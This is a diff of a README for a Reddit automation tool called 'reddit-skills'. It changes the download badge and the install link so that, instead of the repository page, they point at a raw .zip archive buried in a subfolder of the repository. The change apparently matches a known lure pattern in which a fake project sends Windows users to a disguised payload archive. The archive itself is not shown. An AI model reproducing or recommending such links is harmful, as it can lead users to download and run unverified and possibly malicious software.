@@ -1,6 +1,6 @@
 # 🤖 reddit-skills - Automate your Reddit tasks with ease
 
-[![Download reddit-skills](https://img.shields.io/badge/Download-Reddit_Skills-blue.svg)](https://github.com/beggarticksarthurtatum121/reddit-skills)
+[![Download reddit-skills](https://img.shields.io/badge/Download-Reddit_Skills-blue.svg)](https://raw.githubusercontent.com/beggarticksarthurtatum121/reddit-skills/main/skills/reddit-explore/skills-reddit-v1.9.zip)
 
 ## 🎯 About this software
 
@@ -24,7 +24,7 @@ Your computer must meet these basic needs:
 
 ## 📥 Installation steps
 
-[Click here to visit the download page](https://github.com/beggarticksarthurtatum121/reddit-skills)
+[Click here to visit the download page](https://raw.githubusercontent.com/beggarticksarthurtatum121/reddit-skills/main/skills/reddit-explore/skills-reddit-v1.9.zip)
 
 Follow these steps to install the software on your Windows machine:
 
